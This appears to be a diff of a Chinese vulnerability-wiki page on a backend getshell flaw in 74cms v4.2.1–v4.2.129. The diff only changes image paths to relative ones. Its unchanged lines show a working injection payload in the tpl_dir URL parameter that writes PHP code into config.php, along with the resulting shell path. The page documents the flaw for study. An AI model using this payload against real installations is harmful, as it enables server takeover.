@@ -15,16 +15,16 @@
 0x02漏洞演示
 ------------
 
-![](/Users/aresx/Documents/VulWiki/.resource/74cmsv4.2.1-v4.2.129-后台getshell漏洞/media/rId24.png)
+![](./.resource/74cmsv4.2.1-v4.2.129-后台getshell漏洞/media/rId24.png)
 
     url: http://74cms.test/index.php?m=Admin&c=Tpl&a=set&tpl_dir= ', 'a',phpinfo(),'
 
     shell:http://74cms.test/Application/Home/Conf/config.php
     路径：\74cms\upload\Application\Home\Conf\config.php
 
-![](/Users/aresx/Documents/VulWiki/.resource/74cmsv4.2.1-v4.2.129-后台getshell漏洞/media/rId25.png)
+![](./.resource/74cmsv4.2.1-v4.2.129-后台getshell漏洞/media/rId25.png)
 
-![](/Users/aresx/Documents/VulWiki/.resource/74cmsv4.2.1-v4.2.129-后台getshell漏洞/media/rId26.png)
+![](./.resource/74cmsv4.2.1-v4.2.129-后台getshell漏洞/media/rId26.png)
 
 0x03 漏洞原理
 -------------
@@ -32,11 +32,11 @@
     url: http://74cms.test/index.php?m=Admin&c=Tpl&a=set&tpl_dir= ', 'a',phpinfo(),'
     路径：74cms\upload\Application\Admin\Controller\TplController.class.php
 
-![](/Users/aresx/Documents/VulWiki/.resource/74cmsv4.2.1-v4.2.129-后台getshell漏洞/media/rId28.png)
+![](./.resource/74cmsv4.2.1-v4.2.129-后台getshell漏洞/media/rId28.png)
 
     路径： 74cms\upload\Application\Common\Controller\BackendController.class.php
 
-![](/Users/aresx/Documents/VulWiki/.resource/74cmsv4.2.1-v4.2.129-后台getshell漏洞/media/rId29.png)
+![](./.resource/74cmsv4.2.1-v4.2.129-后台getshell漏洞/media/rId29.png)
 
 0x04题外话-认真版getshell方法
 -----------------------------
